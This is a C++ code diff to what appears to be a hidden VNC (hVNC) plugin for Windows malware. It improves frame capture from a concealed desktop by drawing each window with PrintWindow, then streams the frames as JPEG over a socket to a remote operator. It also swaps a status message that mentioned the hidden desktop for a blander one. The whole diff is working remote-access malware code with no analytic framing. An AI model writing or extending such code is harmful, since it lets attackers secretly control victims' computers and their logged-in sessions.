@@ -26,6 +26,10 @@ using json = nlohmann::json;
 using namespace Gdiplus;
 using namespace std;
 
+#ifndef PW_RENDERFULLCONTENT
+#define PW_RENDERFULLCONTENT 0x00000002
+#endif
+
 #pragma pack(push, 1)
 struct PacketHeader {
     uint16_t signature;
@@ -206,6 +210,22 @@ static void ensure_desktop() {
     }
 }
 
+// Window compositing helper
+struct WindowInfo {
+    HWND hwnd;
+    RECT rect;
+};
+
+static BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
+    if (!IsWindowVisible(hwnd)) return TRUE;
+    vector<WindowInfo>* windows = (vector<WindowInfo>*)lParam;
+    RECT rect;
+    if (GetWindowRect(hwnd, &rect)) {
+        windows->push_back({hwnd, rect});
+    }
+    return TRUE;
+}
+
 static void capture_loop() {
     ensure_desktop();
     if (!g_hHiddenDesktop) {
@@ -219,7 +239,7 @@ static void capture_loop() {
         return;
     }
 
-    send_status("Capture started on hidden desktop");
+    send_status("Window compositing capture started");
     while (g_captureRunning) {
         DWORD start = GetTickCount();
         int scale, fps;
@@ -233,29 +253,79 @@ static void capture_loop() {
 
         int sw = GetSystemMetrics(SM_CXSCREEN);
         int sh = GetSystemMetrics(SM_CYSCREEN);
+
+        // Final Frame Bitmap
+        HDC hdcScreen = GetDC(NULL);
+        HDC hdcMem = CreateCompatibleDC(hdcScreen);
+        HBITMAP hbmpMem = CreateCompatibleBitmap(hdcScreen, sw, sh);
+        HGDIOBJ hOldMem = SelectObject(hdcMem, hbmpMem);
+
+        // Background
+        RECT fullRect = {0, 0, sw, sh};
+        HBRUSH hBrushBg = CreateSolidBrush(RGB(45, 45, 45)); // Modern dark grey
+        FillRect(hdcMem, &fullRect, hBrushBg);
+        DeleteObject(hBrushBg);
+
+        // Enum windows and draw them bottom to top
+        vector<WindowInfo> windows;
+        EnumDesktopWindows(g_hHiddenDesktop, EnumWindowsProc, (LPARAM)&windows);
+        reverse(windows.begin(), windows.end()); // Bottom-to-top order
+
+        for (const auto& win : windows) {
+            int ww = win.rect.right - win.rect.left;
+            int wh = win.rect.bottom - win.rect.top;
+            if (ww <= 0 || wh <= 0) continue;
+
+            HDC hdcWin = CreateCompatibleDC(hdcScreen);
+            HBITMAP hbmpWin = CreateCompatibleBitmap(hdcScreen, ww, wh);
+            HGDIOBJ hOldWin = SelectObject(hdcWin, hbmpWin);
+
+            // Capture window content
+            if (PrintWindow(win.hwnd, hdcWin, PW_RENDERFULLCONTENT)) {
+                BitBlt(hdcMem, win.rect.left, win.rect.top, ww, wh, hdcWin, 0, 0, SRCCOPY);
+            } else {
+                // Fallback for windows that don't support PrintWindow well
+                HDC hdcRealWin = GetDC(win.hwnd);
+                if (hdcRealWin) {
+                    BitBlt(hdcMem, win.rect.left, win.rect.top, ww, wh, hdcRealWin, 0, 0, SRCCOPY);
+                    ReleaseDC(win.hwnd, hdcRealWin);
+                }
+            }
+
+            SelectObject(hdcWin, hOldWin);
+            DeleteObject(hbmpWin);
+            DeleteDC(hdcWin);
+        }
+
+        // Scale to final size
         int dw = (sw * scale) / 100;
         int dh = (sh * scale) / 100;
         if (dw < 1) dw = 1; if (dh < 1) dh = 1;
 
-        HDC hdc = GetDC(NULL);
-        if (hdc) {
-            HDC mdc = CreateCompatibleDC(hdc);
-            HBITMAP bmp = CreateCompatibleBitmap(hdc, dw, dh);
-            HGDIOBJ old = SelectObject(mdc, bmp);
-            SetStretchBltMode(mdc, HALFTONE);
-            StretchBlt(mdc, 0, 0, dw, dh, hdc, 0, 0, sw, sh, SRCCOPY | CAPTUREBLT);
-            SelectObject(mdc, old);
+        HDC hdcFinal = CreateCompatibleDC(hdcScreen);
+        HBITMAP hbmpFinal = CreateCompatibleBitmap(hdcScreen, dw, dh);
+        HGDIOBJ hOldFinal = SelectObject(hdcFinal, hbmpFinal);
 
-            vector<unsigned char> jpeg;
-            if (bitmap_to_jpeg(bmp, 50, jpeg)) {
-                if (!safe_send_hvnc_frame(s, scale, fps, dw, dh, jpeg)) {
-                    g_captureRunning = false;
-                }
+        SetStretchBltMode(hdcFinal, HALFTONE);
+        StretchBlt(hdcFinal, 0, 0, dw, dh, hdcMem, 0, 0, sw, sh, SRCCOPY);
+
+        vector<unsigned char> jpeg;
+        if (bitmap_to_jpeg(hbmpFinal, 50, jpeg)) {
+            if (!safe_send_hvnc_frame(s, scale, fps, dw, dh, jpeg)) {
+                g_captureRunning = false;
             }
-            DeleteObject(bmp);
-            DeleteDC(mdc);
-            ReleaseDC(NULL, hdc);
         }
+
+        // Cleanup
+        SelectObject(hdcFinal, hOldFinal);
+        DeleteObject(hbmpFinal);
+        DeleteDC(hdcFinal);
+
+        SelectObject(hdcMem, hOldMem);
+        DeleteObject(hbmpMem);
+        DeleteDC(hdcMem);
+
+        ReleaseDC(NULL, hdcScreen);
 
         DWORD elapsed = GetTickCount() - start;
         DWORD interval = 1000 / (fps > 0 ? fps : 1);
@@ -350,7 +420,6 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
             vector<wchar_t> pathBuffer(wpath.begin(), wpath.end());
             pathBuffer.push_back(L'\0');
 
-            // Correct desktop string for CreateProcess: "WinSta0\DesktopName"
             wstring fullDesktopName = L"WinSta0\\" + g_desktopName;
 
             STARTUPINFOW si = { sizeof(si) };
